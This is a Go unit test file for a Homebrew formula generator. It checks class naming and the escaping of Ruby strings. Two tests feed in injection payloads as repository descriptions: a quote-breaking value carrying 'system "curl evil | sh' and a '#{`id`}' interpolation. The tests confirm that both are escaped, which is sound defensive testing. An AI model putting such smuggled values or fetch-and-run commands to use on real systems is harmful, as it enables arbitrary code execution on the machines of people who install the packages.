package homebrew

import (
	"bytes"
	"strings"
	"testing"

	"github.com/google/go-github/v84/github"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestGenerate_UsesClassNameFromRecipe(t *testing.T) {
	// Files is non-nil (len 0) so Generate doesn't fall back to FillFromGithub.
	r := &Recipe{
		Owner:       "deweysasser",
		Repo:        "cumulus",
		Version:     "v1.2.0-rc1",
		Description: "A tool",
		ClassName:   "CumulusAT120rc1",
		Files:       []PackageFile{},
	}

	// len(Files)==0 triggers the auto-fetch branch, which we don't want in
	// this unit test. Poke at the branch by giving Generate a non-empty slice
	// of fake files that never get sha256'd because the template won't match
	// them to any OS/arch filter (no "darwin"/"linux" substring).
	r.Files = fakeFilesNoMatch()

	var buf bytes.Buffer
	require.NoError(t, r.Generate(&buf))

	out := buf.String()
	assert.True(t, strings.Contains(out, "class CumulusAT120rc1 < Formula"),
		"rendered formula must use ClassName verbatim; got:\n%s", out)
	assert.Contains(t, out, `version "v1.2.0-rc1"`)
	assert.Contains(t, out, `desc "A tool"`)
	assert.Contains(t, out, `homepage "https://github.com/deweysasser/cumulus"`)
}

func TestGenerate_DefaultFormulaClassName(t *testing.T) {
	r := &Recipe{
		Owner:       "o",
		Repo:        "my-tool",
		Version:     "v1.0.0",
		Description: "x",
		ClassName:   "MyTool",
		Files:       fakeFilesNoMatch(),
	}

	var buf bytes.Buffer
	require.NoError(t, r.Generate(&buf))
	assert.Contains(t, buf.String(), "class MyTool < Formula")
}

func TestRubyStringEscape(t *testing.T) {
	tests := []struct {
		name, in, want string
	}{
		{"plain", "hello world", "hello world"},
		{"double quote", `say "hi"`, `say \"hi\"`},
		{"backslash", `path\to\thing`, `path\\to\\thing`},
		{"backslash before quote", `a\"b`, `a\\\"b`}, // \\ first, then \"
		{"hash interpolation", `value=#{1+1}`, `value=\#{1+1}`},
		{"bare hash is ok but still escaped defensively", "issue #42", `issue \#42`},
		{"newline passes through", "line1\nline2", "line1\nline2"},
		{"empty", "", ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			assert.Equal(t, tt.want, rubyStringEscape(tt.in))
		})
	}
}

// TestGenerate_EscapesRubyInjectionInDescription confirms that a crafted
// repo description cannot break out of the desc "..." literal and inject
// Ruby. Without rubyStringEscape, a description like:  foo" ; system "evil
// would render as: desc "foo" ; system "evil"  — executing attacker code
// at `brew install` time.
func TestGenerate_EscapesRubyInjectionInDescription(t *testing.T) {
	r := &Recipe{
		Owner:       "o",
		Repo:        "tool",
		Version:     "v1.0.0",
		Description: `foo" ; system "curl evil | sh`,
		ClassName:   "Tool",
		Files:       fakeFilesNoMatch(),
	}

	var buf bytes.Buffer
	require.NoError(t, r.Generate(&buf))
	out := buf.String()

	// The rendered line must contain the escaped form, not the raw form
	// that would terminate the Ruby string early.
	assert.Contains(t, out, `desc "foo\" ; system \"curl evil | sh"`,
		"description must be escaped inside the Ruby double-quoted literal; got:\n%s", out)
	assert.NotContains(t, out, `desc "foo" ; system "curl`,
		"unescaped form must not appear — Ruby would parse the injection as real code")
}

// TestGenerate_EscapesRubyInterpolationInDescription confirms the #{...}
// neutralization: Ruby expands #{expr} inside "..." literals. A description
// with #{`id`} would execute the `id` command at formula-load time without
// the # -> \# escape.
func TestGenerate_EscapesRubyInterpolationInDescription(t *testing.T) {
	r := &Recipe{
		Owner:       "o",
		Repo:        "tool",
		Version:     "v1",
		Description: "oops #{`id`}",
		ClassName:   "Tool",
		Files:       fakeFilesNoMatch(),
	}
	var buf bytes.Buffer
	require.NoError(t, r.Generate(&buf))
	out := buf.String()

	assert.Contains(t, out, `desc "oops \#{`+"`"+`id`+"`"+`}"`,
		"# must be backslash-escaped so #{...} is not recognized as interpolation; got:\n%s", out)
}

// fakeFilesNoMatch returns a Files slice that is non-empty (so Generate
// skips the auto-fetch branch) but contains no names matching the
// darwin/linux × amd64/arm64 filter — so template rendering never calls
// Sha256() and makes no network calls.
func fakeFilesNoMatch() []PackageFile {
	return []PackageFile{{
		ReleaseAsset: &github.ReleaseAsset{
			BrowserDownloadURL: github.Ptr("https://example.invalid/does-not-match-any-platform.txt"),
		},
	}}
}
